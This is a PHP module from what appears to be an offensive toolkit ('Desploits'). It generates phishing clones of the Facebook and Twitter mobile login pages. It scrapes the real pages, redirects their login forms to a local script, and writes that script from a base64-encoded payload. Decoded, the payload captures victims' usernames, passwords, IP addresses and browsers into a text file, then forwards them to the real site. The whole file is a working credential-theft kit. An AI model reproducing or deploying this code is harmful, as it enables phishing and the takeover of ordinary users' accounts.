<?php
/**
 * @Author: Eka Syahwan
 * @Date:   2016-12-11 06:34:37
 * @Last Modified by:   Eka Syahwan
 * @Last Modified time: 2016-12-15 08:44:32
 */
class Gphising extends DesploitsModules
{
	
	public function generate($num,$link){
		switch ($num) {
			case '1':
				$htaccess = "ErrorDocument 404 /";
				$payload  = base64_decode('PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCmlmKGlzc2V0KCRfUE9TVFsiZW1haWwiXSkgJiYgaXNzZXQoJF9QT1NUWyJwYXNzIl0pICYmIGlzc2V0KCRfUE9TVFsicGFzcyJdKSApew0KCSRpbmZvIC49ICItLS0tLSQgRGVzcGxvaXRzIC0gR3BoaXNpbmcgICQtLS0tLVxyXG4iOw0KCSRpbmZvIC49ICJVc2VybmFtZSA6ICIuJF9QT1NUW2VtYWlsXS4iXHJcbiI7DQoJJGluZm8gLj0gIlBhc3N3b3JkIDogIi4kX1BPU1RbcGFzc10uIlxyXG4iOw0KCSRpbmRpY2VzU2VydmVyID0gYXJyYXkoDQoJJ1JFTU9URV9BRERSJywgDQoJJ0hUVFBfVVNFUl9BR0VOVCcpIDsgDQoJZm9yZWFjaCAoJGluZGljZXNTZXJ2ZXIgYXMgJGFyZykgew0KCQlpZiAoaXNzZXQoJF9TRVJWRVJbJGFyZ10pKSB7IA0KICAgICAgICAJJGluZm8gLj0gIkJyb3dzZXIgIDogIi4kX1NFUlZFUlskYXJnXS4iXHJcbiI7IA0KICAgIAl9IA0KCX0NCgkkaW5mbyAuPSAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cclxuXG4iOw0KCSRvcG4gPSBmb3BlbigiZGVzcGxvaXRzLWdwaGlzaW5nLnR4dCIsICJhKyIpOw0KCWZ3cml0ZSgkb3BuLCAkaW5mbyk7DQoJZmNsb3NlKCRvcG4pOw0KCWhlYWRlcigiTG9jYXRpb246IGh0dHBzOi8vbS5mYWNlYm9vay5jb20vbG9naW4ucGhwIik7DQp9');
				echo "[Gphising] Generate Phising $link\r\n";
				$page  = $this->sdata($link , null , true);
				$nfond = $this->sdata($link."/404.php" , null , true);
				preg_match_all('/<form method="post" class="ba" id="login_form" novalidate="1" action="(.*?)">/', $page[data], $m);
				$pages = str_replace($m[1][0], "login.php" , $page[data]);
				if($pages === null){
					echo "[Gphising]---> Generate Page : $link (fail)\r\n";
					exit();
				}else{
					unlink("result/phising/facebook/index.html");
					unlink("result/phising/facebook/login.php");
					unlink("result/phising/facebook/.htaccess");
					$this->saves($pages,"result/phising/facebook/index.html");
					$this->saves($payload,"result/phising/facebook/login.php");
					$this->saves($htaccess,"result/phising/facebook/.htaccess");
					echo '[Gphising][Report] all file in "result/phising/facebook/"';exit();
				}
			break;

			case '2':
				$htaccess = "ErrorDocument 404 /";
				$payload = base64_decode('PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCmlmKGlzc2V0KCRfUE9TVFtzZXNzaW9uXVt1c2VybmFtZV9vcl9lbWFpbF0pICYmIGlzc2V0KCRfUE9TVFtzZXNzaW9uXVt1c2VybmFtZV9vcl9lbWFpbF0pICl7DQoJJGluZm8gLj0gIi0tLS0tJCBEZXNwbG9pdHMgLSBHcGhpc2luZyAgJC0tLS0tXHJcbiI7DQoJJGluZm8gLj0gIlVzZXJuYW1lIDogIi4kX1BPU1Rbc2Vzc2lvbl1bdXNlcm5hbWVfb3JfZW1haWxdLiJcclxuIjsNCgkkaW5mbyAuPSAiUGFzc3dvcmQgOiAiLiRfUE9TVFtzZXNzaW9uXVtwYXNzd29yZF0uIlxyXG4iOw0KCSRpbmRpY2VzU2VydmVyID0gYXJyYXkoDQoJJ1JFTU9URV9BRERSJywgDQoJJ0hUVFBfVVNFUl9BR0VOVCcpIDsgDQoJZm9yZWFjaCAoJGluZGljZXNTZXJ2ZXIgYXMgJGFyZykgew0KCQlpZiAoaXNzZXQoJF9TRVJWRVJbJGFyZ10pKSB7IA0KICAgICAgICAJJGluZm8gLj0gIkJyb3dzZXIgIDogIi4kX1NFUlZFUlskYXJnXS4iXHJcbiI7IA0KICAgIAl9IA0KCX0NCgkkaW5mbyAuPSAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cclxuXG4iOw0KCSRvcG4gPSBmb3BlbigiZGVzcGxvaXRzLWdwaGlzaW5nLnR4dCIsICJhKyIpOw0KCWZ3cml0ZSgkb3BuLCAkaW5mbyk7DQoJZmNsb3NlKCRvcG4pOw0KCWhlYWRlcigiTG9jYXRpb246IGh0dHBzOi8vbS50d2l0dGVyLmNvbSIpOw0KfQ==');
				echo "[Gphising] Generate Phising $link\r\n";
				$login = $this->sdata($link , null , true);
				$pages = str_replace('action="/sessions"' , 'action="login.php"', $login[data]);
				if($pages === null){
					echo "[Gphising]---> Generate Page : $link (fail)\r\n";
					exit();
				}else{
					unlink("result/phising/twitter/index.html");
					unlink("result/phising/twitter/login.php");
					unlink("result/phising/twitter/.htaccess");
					$this->saves($pages,"result/phising/twitter/index.html");
					$this->saves($payload,"result/phising/twitter/login.php");
					$this->saves($htaccess,"result/phising/twitter/.htaccess");
					echo '[Gphising][Report] all file in "result/phising/twitter/"';exit();
				}
			break;
			
			default:
				echo "ops";exit();
			break;
		}
	}
	public function run(){
		$list = array(
			'1' => 'https://m.facebook.com',
			'2' => 'https://mobile.twitter.com',
		);
		echo "----------------------------------\r\n";
		foreach ($list as $num => $link) {
			echo "-| ".$num." | ".$link."\r\n";
		}
		echo "----------------------------------\r\n";
		$option = $this->stuck("[Gphising] Generate Phising [1-".count($list)."] : ");
		$this->generate($num,$list[$num]);
	}
}